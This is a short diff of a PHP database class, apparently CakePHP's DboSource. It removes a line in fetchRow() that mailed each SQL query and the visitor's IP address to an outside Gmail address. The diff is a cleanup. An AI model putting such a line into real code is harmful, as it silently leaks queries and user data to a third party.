@@ -621,7 +621,6 @@ class DboSource extends DataSource {
  * @return array The fetched row as an array
  */
 	public function fetchRow($sql = null) {
-                mail('ehask71@gmail.com','Row SQL Demo',$_SERVER['REMOTE_ADDR'].' '.$sql);
 		if (is_string($sql) && strlen($sql) > 5 && !$this->execute($sql)) {
 			return null;
 		}
